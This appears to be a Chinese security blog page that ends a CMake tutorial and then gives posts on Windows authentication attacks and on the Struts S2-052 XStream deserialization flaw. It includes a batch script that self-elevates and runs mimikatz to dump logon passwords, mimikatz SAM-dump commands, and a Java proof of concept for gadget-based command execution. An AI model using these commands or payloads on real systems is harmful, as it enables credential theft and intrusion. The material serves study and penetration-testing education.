<li>windows下使用<br><img src="/2017/09/28/CmakeVSautotools/cmake.png" alt=""><h4 id="Cmake-语法简单介绍"><a href="#Cmake-语法简单介绍" class="headerlink" title="Cmake 语法简单介绍"></a>Cmake 语法简单介绍</h4>可以把cmake理解为一种简单的语言，它也有着它的语法和变量。它的语法规则很简单<br><br>1.变量使用${}方式取值<br><br>2.指令（参数1 参数2 。。。）<br><br>3.指令是大小写无关的，参数和变量是大小写敏感的，例如set 和SET 作为指令都是可以的，但是建议全部使用大写的指令。<br><br>4.cmake的语法还是比较灵活且考虑到了各种情况，比如SET(SOURCES_FILES main.c)也可以写成SET(SOURCES_FILES “main.c”)，但是假设一个源文件中的文件名是fu nc.c（中间有了空格），这个时候就有必要加上双引号了。<br><br>5.清理工程，跟经典的autotools系列工具一样，make clean可以对构建结果进行清理。<br><br>6.内部构建和外部构建。内部构建就是直接在根目录下面构建(会在工程目录下产生很多文件，使工程看起来比较乱)，而使用外部构建比如在工程目录下面创建一个build的目录，然后进入build目录下，进行cmake .. 这样生成的文件都在build目录下。推荐是有外部构建，所以一般的构建命令就是进入 build 目录下面，然后 cmake ..  make<br>7.注意cmake 是构建项目的过程,是产生Makefile的过程，也就是生成编译指令的过程，这个过程不会包编译的错误。make才是编译和链接的过程，如果你的代码有问题，或者你的编译指令有有问题(比如未包含动态或者静态的lib)这是时候会产生错误。<br><br>8.ADD_LIBRARY()用来生成动态或者静态链接库的。INCLUDE_DIRECTORY()是用来向工程添加多个特定的头文件搜索路径的，路径之间用空格分开，如果路径中包含了空格，可以使用双引号将它括起来。默认的行为是追加到当前的头文件搜索路径的后面。LINK_DIRECTORIES()添加非标准的共享库搜索路径，TARGET_LINK_LIBRARIES(target  library1 library2),这个指令可以用来为target添加需要连接的共享库.<br><br><img src="/2017/09/28/CmakeVSautotools/makeparam.png" alt=""><br><br><img src="/2017/09/28/CmakeVSautotools/linklib.png" alt=""><br><a href="https://github.com/kevien/cmakesample" target="_blank" rel="external">测试代码见github</a><h4 id="autotools使用"><a href="#autotools使用" class="headerlink" title="autotools使用"></a>autotools使用</h4></li>
<li><a href="https://geesun.github.io/posts/2015/02/autotool.html" target="_blank" rel="external">使用autotools生成Makefile学习笔记</a></li>
<li><a href="http://leolovenet.com/downloads/files/autotools.pdf" target="_blank" rel="external">autotools入门</a><h4 id="使用libtool创建库"><a href="#使用libtool创建库" class="headerlink" title="使用libtool创建库"></a>使用libtool创建库</h4><a href="https://www.ibm.com/developerworks/cn/aix/library/1007_wuxh_libtool/index.html" target="_blank" rel="external">使用libtool创建库</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><a href="https://github.com/darx0r/SC-A-Make" target="_blank" rel="external">cmake导致的命令执行问题</a><br><a href="http://thebigdoc.readthedocs.io/en/latest/auto-make-conf.html" target="_blank" rel="external">automake 和 autoconf 使用简明教程</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.youtube.com/watch?v=gYmgbqGfv-8" target="_blank" rel="external">https://www.youtube.com/watch?v=gYmgbqGfv-8</a><br><a href="https://stackoverflow.com/questions/7132862/tutorial-for-converting-autotools-to-cmake" target="_blank" rel="external">https://stackoverflow.com/questions/7132862/tutorial-for-converting-autotools-to-cmake</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="M0rk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0rk's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/09/20/windows认证机制以及常见密码获取工具分析/" itemprop="url">
                  windows认证机制以及常见密码获取工具分析
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            

            

            
          </span>

          

          
            
          

          
          

          

          

          
          
        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
<li>先来了解一下lsass进程。<br>Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.<a href="https://www.wikiwand.com/en/Local_Security_Authority_Subsystem_Service" target="_blank" rel="external">link</a></li>
<li>NTLM</li>
<li>Kerberos<h2 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h2></li>
<li>SAM security account manager 账户安全管理。存放位置<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">%SystemRoot%/system32/config/SAM</div><div class="line"> HKEY_LOCAL_MACHINE\SAM</div></pre></td></tr></table></figure>
</li>
</ul>
<p>Windows一旦启动 无法读取，但是可以通过读取内存的方法进行读取。<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/sam.png" alt=""><br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/regeditsam.png" alt=""></p>
<ul>
<li>这里有个点就是rid劫持(修改F键中值F5位F4)<br><a href="https://www.youtube.com/watch?v=hilLHF37ng8" target="_blank" rel="external">rid劫持参考</a><h2 id="LM-hash、NTLM-hash和NetNTLM"><a href="#LM-hash、NTLM-hash和NetNTLM" class="headerlink" title="LM hash、NTLM hash和NetNTLM"></a>LM hash、NTLM hash和NetNTLM</h2></li>
<li><p>在Windows系统中，比较常见是从系统导出来的NTLM hash，通过Hashcat能够破解出明文密码。</p>
</li>
<li><p>Hashcat支持超过200种高度优化的hash算法，其中和NTLM hash相关的有4个，分别为NetNTLMv1、NetNTLMv1+ESS、NetNTLMv2和NTLM。Hashcat支持的哈希算法：<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="external">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
</li>
<li><p>自Windows Vista和Windows Server 2008开始,Windows取消LM hash,但某些工具的参数需要填写固定格式LM hash:NT hash，可以将LM hash填0(LM hash可以为任意值)，即00000000000000000000000000000000:NT hash</p>
</li>
<li><p>NTHash (又称作NTLM)，现代操作系统都是用的这种格式密码，我们可以通过dump SAM文件或者使用mimikatz获取到，此外它还存在于域控机器的NTDS文件中。这些哈希值可以用来进行哈希传递攻击。<br>算法是 MD4(UTF-16-LE(password))  NTLM哈希长度为32位。</p>
</li>
<li><p>Net-NTMLv1/v2 是指网络环境下NTLM认证中的哈希，也可使用hashcat进行破解。</p>
</li>
<li><p>Net-NTLM hash在渗透测试中，通常有以下两种利用方法<br>1.使用中间人攻击的方式来获取Net-NTLM hash，常用工具为Responder和Inveigh，方法见<a href="https://github.com/incredibleindishell/Windows-AD-environment-related/tree/master/Responder" target="_blank" rel="external">How to use responder tool to perform exploitation in windows environment by stealing NTLMv2 hashes.</a><br>2.通过多种方式强制目标客户端向伪造的服务器发起SMB连接，在伪造的服务器上捕获数据包，获得Net-NTLM hash<br><a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="external">Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍</a><br><a href="http://www.mannulinux.org/2018/12/how-to-steal-ntlmv2-hashes-using-file.html" target="_blank" rel="external">How to steal NTLMv2 hashes using file download vulnerability in web application</a><br><a href="https://www.hackingarticles.in/capture-ntlm-hashes-using-pdf-bad-pdf/" target="_blank" rel="external">Capture NTLM Hashes using PDF (Bad-Pdf)</a></p>
<h2 id="获取明文密码的几种方式"><a href="#获取明文密码的几种方式" class="headerlink" title="获取明文密码的几种方式"></a>获取明文密码的几种方式</h2></li>
<li>虽然在内网中可以通过PTH或者PTK就可以进行横向渗透，但是只能通过命令行进行操作，但当你有了明文密码时候就可以可以直接登录web、vpn、远程桌面等。<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3></li>
<li>Group Policy Preference,<br><a href="https://www.youtube.com/watch?v=wT4aemT9SZQ" target="_blank" rel="external">参考</a><h3 id="mimikatz的lsass-mimidumps"><a href="#mimikatz的lsass-mimidumps" class="headerlink" title="mimikatz的lsass mimidumps"></a>mimikatz的lsass mimidumps</h3></li>
<li>首先可以使用ProcDump工具将lsass进程内存dump出来，使用mimikatz也可以直接获取用户明文密码或哈希，但是可能会被杀软给查杀。此外在windows高版本(NT6)上还可以通过任务管理器中的创建存储文件进行lsass进程内存dump。</li>
<li>通过mimikatz导入dump的内存文件，进行解密.<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/procdump.png" alt=""><br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/createdump.png" alt=""><br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/minidump.png" alt=""><br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/minidump1.png" alt=""><h3 id="WDigest"><a href="#WDigest" class="headerlink" title="WDigest"></a>WDigest</h3></li>
<li>Digest认证最早出现在windows XP中，主要用来<a href="https://technet.microsoft.com/en-us/library/cc778868(v=ws.10" target="_blank" rel="external">HTTP和SASL认证</a>.aspx),它会在本地保存明文密码。在2014年微软打了个<a href="https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a" target="_blank" rel="external">补丁</a>用来去禁止保存用户密码，但是很多服务器和PC并没有禁止WDigest。<h3 id="可逆加密"><a href="#可逆加密" class="headerlink" title="可逆加密"></a>可逆加密</h3></li>
<li><h2 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h2><h3 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h3></li>
<li>NTLM认证是Challenge – Response 模式<br>在使用NTLM协议时，客户端发送用户名到服务器端；服务器生成一个challenge并发送给客户端；客户端使用用户的密码来加密这个challenge，然后发送response到服务器端。如果该账号是一个本机账号，那么服务器使用Security Account Manager来验证用户；如果账号是一个域账号，那么服务器把这个response请求转送到域控制器(DC)上来让域控制器调用组安全策略来做用户认证，然后服务器就可以构建一个安全令牌并建立一个session。<h2 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h2><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/kerberos.png" alt=""></li>
<li>Kerberos认证提供一种服务器和客户端相互认证的机制。Kerberos包含了三个关键组件：Key Distribution Center (KDC)，客户端用户，和一个运行所需服务的服务器。KDC是域控制器的一部分，它执行两个任务：认证服务(AS)和票据许可服务(TGS)。当客户端用户登录到网络上时，它会向用户所在域的AS去请求一个“票据请求票据”（TGT）。然后，当客户端想要访问网络上的某个资源的话，它就出示以下东西：TGT，认证码，Server Principal Name（SPN）；有了这些东西，客户端就可以从服务所在的域中的TGS获得session票据。使用这个session票据，客户端就可以和网络上的服务进行交流，该服务会验证“认证码”然后创建一个访问令牌给客户端用户，接下来客户端就可以登录上该服务了。</li>
<li>相比kerberos，https可能更为熟悉一点，通过证书和非对称加密的方式，让客户端可以安全的访问服务端，但这仅仅是客户端安全，通过校验，客户端可以保证服务端是安全可靠的，而服务端却无法得知客户端是不是安全可靠的。这也是互联网的一种特性。而kerberos可以支持双向认证，就是说，可以保证客户端访问的服务端是安全可靠的，服务端回复的客户端也是安全可靠的。<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/klist.png" alt=""></li>
<li>klist 命令显示 Kerberos 凭证高速缓存或密钥表的内容。<h3 id="SPN-service-principal-name-扫描"><a href="#SPN-service-principal-name-扫描" class="headerlink" title="SPN(service principal name) 扫描"></a>SPN(service principal name) 扫描</h3></li>
<li>Kerberos是一种支持票证身份验证的安全协议。如果客户端计算机身份验证请求包含有效的用户凭据和服务主体名称 (SPN)，则 Kerberos 身份验证服务器将授予一个票证以响应该请求。然后，客户端计算机使用该票证来访问网络资源。在内部网络中，SPN扫描通过 查询向域控制器执行服务发现。这对于红队而言，可以帮助他们识别正在运行重要服务的主机，如终端、交换机、微软SQL等，并隐藏他们。此外，SPN的识别也是kerberoasting攻击的第一步。<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3></li>
<li>先假设这么一种情况,原先已拿到的域内所有的账户hash,包括krbtgt这个账户,由于有些原因导致域管权限丢失,但好在你还有一个普通域用户权限,碰巧管理员在域内加固时忘记重置krbtgt密码,基于此条件,我们还能利用该票据重新获得域管理员权限,利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz),能够绕过对任意用户的账号策略,让用户成为任意组的成员,可用于Kerberos认证的任何服务.</li>
<li>在后渗透阶段，攻击者一般会导出golden ticket，当在“丢失”域控权限的时候(比如修改了域管的账号密码但没有修改krbtgt账号密码)就可以通过注入golden ticket的方式再次拿下并控制域控服务器。注：这个时候需要一台域内或者域外机器(域外机器需要配置dns为域控或域内dns服务器)，此外由于票据中都是以域名为区分的，所以在利用的时候也应该使用域名，而不能是IP地址。</li>
<li>说到底还是利用了krbtgt的密码不发生改变的特性。<h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3></li>
<li>通过观察Kerberos协议的认证过程不难发现,如果我们获取了Server秘钥Ks(服务器口令散列值),就可以跳过KDC的认证，直接伪造票据和目标Server通信<h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><a href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1" target="_blank" rel="external">Attacking Kerberos</a>.pdf)<br><a href="https://github.com/nidem/kerberoast" target="_blank" rel="external">kerberoast</a><h2 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h2><a href="http://smartechverse.blogspot.com/2015/06/crack-windows-admin-password-and-sam.html" target="_blank" rel="external">Crack windows Admin Password and Sam Files</a><br><a href="http://davenport.sourceforge.net/ntlm.html" target="_blank" rel="external">The NTLM Authentication Protocol and Security Support Provider</a><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><h3 id="内存导出"><a href="#内存导出" class="headerlink" title="内存导出"></a>内存导出</h3><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/procdump.png" alt=""></li>
<li>从本地获取密码<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzdmp.png" alt=""></li>
<li>自动获取内存密码bat脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">@echo off</div><div class="line">&gt;nul 2&gt;&amp;1 &quot;%SYSTEMROOT%\system32\cacls.exe&quot; &quot;%SYSTEMROOT%\system32\config\system&quot;</div><div class="line">if &apos;%errorlevel%&apos; NEQ &apos;0&apos; (</div><div class="line">goto UACPrompt</div><div class="line">) else ( goto gotAdmin )</div><div class="line">:UACPrompt</div><div class="line">echo Set UAC = CreateObject^(&quot;Shell.Application&quot;^) &gt; &quot;%temp%\getadmin.vbs&quot;</div><div class="line">echo UAC.ShellExecute &quot;%~s0&quot;, &quot;&quot;, &quot;&quot;, &quot;runas&quot;, 1 &gt;&gt; &quot;%temp%\getadmin.vbs&quot;</div><div class="line">&quot;%temp%\getadmin.vbs&quot;</div><div class="line">exit /B</div><div class="line">:gotAdmin</div><div class="line">if exist &quot;%temp%\getadmin.vbs&quot; ( del &quot;%temp%\getadmin.vbs&quot; )</div><div class="line">pushd &quot;%CD%&quot;</div><div class="line">CD /D &quot;%~dp0&quot;</div><div class="line"></div><div class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="mimikatz-skeleton-key"><a href="#mimikatz-skeleton-key" class="headerlink" title="mimikatz skeleton key"></a>mimikatz skeleton key</h3><ul>
<li>这个主要用于域控权限维持。</li>
<li>Skeleton Key被安装在64位的域控服务器上，支持Windows Server2003—Windows Server2012 R2，能够让所有域用户使用同一个万能密码进行登录，现有的所有域用户使用原密码仍能继续登录，重启后失效。</li>
<li>可以试试你们的域控是不是已经安装这个后门了哦；）<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzskeleton.png" alt=""><br><a href="https://www.youtube.com/watch?v=3gnZ4e1T_cs" target="_blank" rel="external">视频链接</a><h3 id="mimikatz-绕过cmd、regedit、taskmgr限制"><a href="#mimikatz-绕过cmd、regedit、taskmgr限制" class="headerlink" title="mimikatz 绕过cmd、regedit、taskmgr限制"></a>mimikatz 绕过cmd、regedit、taskmgr限制</h3></li>
<li>如果管理员禁用了cmd、regedit、taskmgr的话，可以分别使用misc::cmd、<br>misc::regedit、misc::taskmgr进行绕过。<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzrestrictionbypass.png" alt=""><h3 id="dump-sam"><a href="#dump-sam" class="headerlink" title="dump sam"></a>dump sam</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">privilege::debug</div><div class="line">token::whoami</div><div class="line">token::elevate</div><div class="line">lsadump::sam</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/lsadumpsam.png" alt=""></p>
<h2 id="other-1"><a href="#other-1" class="headerlink" title="other"></a>other</h2><ul>
<li>建议有时间精力可以读读mimikatz的源码。<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2></li>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ee663293(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/ee663293(v=vs.85).aspx</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378747(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa378747(v=vs.85).aspx</a></li>
<li><a href="http://blog.csdn.net/qq_26886929/article/details/53905654" target="_blank" rel="external">http://blog.csdn.net/qq_26886929/article/details/53905654</a></li>
<li><a href="http://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="external">http://blog.csdn.net/wulantian/article/details/42418231</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/wiki</a><br><a href="https://room362.com/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" target="_blank" rel="external">USING MIMIKATZ ALPHA OR GETTING CLEAR TEXT PASSWORDS WITH A MICROSOFT TOOL</a><br><a href="http://www.vuln.cn/6816" target="_blank" rel="external">域渗透——Skeleton Key – 三好学生</a><br><a href="https://blogs.msdn.microsoft.com/apgcdsd/2011/09/26/kerberosntlm-sql-server/" target="_blank" rel="external">Kerberos和NTLM – SQL Server连接的那点事</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="M0rk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0rk's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/09/17/struts-052和struts-053分析/" itemprop="url">
                  struts-052和struts-053分析
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            

            

            
          </span>

          

          
            
          

          
          

          

          

          
          
        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。</p>
<h4 id="s2-052"><a href="#s2-052" class="headerlink" title="s2-052"></a>s2-052</h4><p><a href="struts2-rest-showcase.war">漏洞war包下载</a><br><a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="external">官方通告</a><br>在分析这个漏洞之前，先补补基础知识。<br><br>了解一下xstream这个包，看一下官方的一句话介绍，XStream is a simple library to serialize objects to XML and back again.就是一个序列化java对象为xml以及将xml反序列化为java对象。<br><br>我之前分析过json序列化和反序列化时常用的几种方法，今天我也学习一下xml序列化和反序列化的方法，目前来说有两种，一种是XMLDecoder，另外一种是xstream，xstream使用的比较早的多，然后这次的s2-052就是利用的xstream。<br><br><br>xstream反序列化的问题由来已久，早在四年前，老外就在defcon中讲述了这个问题<a href="https://www.youtube.com/watch?v=L6gXSiGtoqg" target="_blank" rel="external">link</a>，而且之前jenkins的反序列化漏洞也是和xstream有关。<br><br><img src="/2017/09/17/struts-052和struts-053分析/xmlGenMain.png" alt=""><br>我们可以看到，通过XMLGenerator.generateXML的方法就进行了序列化，而通过XMLGenerator.generateTOfromXML就进行了反序列化。这个XMLGenerator类的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">import com.thoughtworks.xstream.XStream;</div><div class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</div><div class="line"></div><div class="line">public final class XMLGenerator &#123;</div><div class="line">/*</div><div class="line"> * this class is for generating XML </div><div class="line"> */</div><div class="line"> </div><div class="line"> /*</div><div class="line">  * initialization of XStream class </div><div class="line">  */</div><div class="line"> private static XStream xstream = new XStream(new DomDriver())</div><div class="line"> &#123;&#123;</div><div class="line">  processAnnotations(Square.class);</div><div class="line">  processAnnotations(Rectangle.class);</div><div class="line"> &#125;&#125;;</div><div class="line"> </div><div class="line"> /*</div><div class="line">  * This class is for generating XML from MODEL class</div><div class="line">  * @param Object</div><div class="line">  * @return String </div><div class="line">  */</div><div class="line"> public static String generateXML(Object to) &#123;</div><div class="line">  return null == to ? &quot;&quot; : xstream.toXML(to);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> /*</div><div class="line">  * Generates the transfer object from the given XML using XStream.</div><div class="line">  * </div><div class="line">  * @param String</div><div class="line">  * @return transfer object</div><div class="line">  */</div><div class="line"> public static Object generateTOfromXML(String xml) &#123;</div><div class="line">  return xstream.fromXML(xml);</div><div class="line"> &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里就用到了XStream。<br>现在我们再来看一下这样的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">import com.thoughtworks.xstream.XStream;</div><div class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</div><div class="line"></div><div class="line">public class xstreamPOC &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) </div><div class="line">	&#123;</div><div class="line">//		String payload = &quot;&lt;square&gt;&quot;+ </div><div class="line">//						 &quot;	&lt;size&gt;5&lt;/size&gt;&quot;+</div><div class="line">//						 &quot;&lt;/square&gt; &quot;;	</div><div class="line">		String payload = &quot;&lt;string&gt;&quot;+ </div><div class="line">				 		&quot;	hello&quot;+</div><div class="line">				 		 &quot;&lt;/string&gt; &quot;;</div><div class="line">		</div><div class="line">		String inputXML = payload;</div><div class="line">		</div><div class="line">		//Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">		//the next code is what the XMLGenerator.generateTOfromXML is doing:</div><div class="line">		XStream xstream = new XStream(new DomDriver())	</div><div class="line">											&#123;&#123;</div><div class="line">												processAnnotations(Square.class);</div><div class="line">												processAnnotations(Rectangle.class);</div><div class="line">											&#125;&#125;;		</div><div class="line">		Square sq1 = (Square)xstream.fromXML(inputXML);</div><div class="line">		</div><div class="line">		System.out.println(String.format(&quot;sq1: \n \n%s \n\n&quot;, sq1));</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="/2017/09/17/struts-052和struts-053分析/xstreamstring.png" alt=""><br>从上图可以看到，当我在序列化一个包含有string关键字的xml时候，他会首先产生一个string的类，然后强制转换成Square类。危险就出现在这里了，XStream将创建定义在xml中的对象。<br><br>那么如果我们换成下面的payload呢<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ </div><div class="line">		 &quot;     &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+</div><div class="line">		 &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;;</div></pre></td></tr></table></figure></p>
<p><img src="/2017/09/17/struts-052和struts-053分析/stringsExec.png" alt=""><br>可以看到我们就会实例化这个ProcessBuilder这个类。但是呢，目前为止我们还是只能创建对象，并不能invoke它们，所以这个时候就需要动态代理和EventHandle这两个技巧了。<br>看下面这样的代码，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import java.beans.EventHandler;</div><div class="line">import java.util.Set;</div><div class="line">import java.util.TreeSet;</div><div class="line"></div><div class="line">public class XStreamPoC &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) </div><div class="line">	&#123;		</div><div class="line">		Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();</div><div class="line">        set.add(&quot;foo&quot;);</div><div class="line"></div><div class="line">        set.add(EventHandler.create(Comparable.class, </div><div class="line">        			new ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;));</div><div class="line">		</div><div class="line">        String setXml = XMLGenerator.generateXML(set);</div><div class="line">		/*String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ </div><div class="line">						 &quot;     &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+</div><div class="line">						 &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;;		</div><div class="line">		</div><div class="line">		String inputXML = payload;</div><div class="line">		</div><div class="line">		Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">		//Object sq1 = XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">			</div><div class="line">		System.out.println(String.format(&quot;sq1 value: %s \n\nsq1 class: %s&quot;, sq1, sq1.getClass()));</div><div class="line">		 */</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
